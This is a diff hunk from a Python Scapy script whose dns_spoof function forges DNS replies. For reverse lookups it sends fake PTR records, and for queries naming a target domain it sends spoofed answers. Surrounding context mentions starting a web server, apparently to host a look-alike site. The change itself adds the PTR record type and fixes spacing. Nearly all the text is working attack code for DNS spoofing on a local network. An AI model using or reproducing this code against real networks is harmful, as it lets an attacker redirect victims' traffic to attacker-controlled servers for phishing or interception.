@@ -64,18 +64,18 @@ def start_web_server(port, directory):
 def dns_spoof(pkt):
     if DNS in pkt and pkt[DNS].qr == 0:  # QR == 0 means it's a DNS request
         if "in-addr.arpa" in pkt[DNS].qd.qname.decode():
-            # Construct the fake DNS response for reverse lookup
+            # Construct the fake DNS response for reverse lookup (PTR record)
             spoofed_pkt = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) / \
                           IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                           UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                           DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
-                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=fake_answer))
+                              an=DNSRR(rrname=pkt[DNS].qd.qname, type="PTR", ttl=10, rdata=fake_answer))
             sendp(spoofed_pkt, verbose=0)
             print(f"Sent spoofed reverse DNS response to {pkt[IP].src}")
         elif target_domain in pkt[DNS].qd.qname.decode():
             print(f"Spoofing DNS request for {target_domain}")
             # Construct the DNS response
-            spoofed_pkt = Ether(src=pkt[Ether].dst,dst=pkt[Ether].src) / \
+            spoofed_pkt = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) / \
                           IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                           UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                           DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
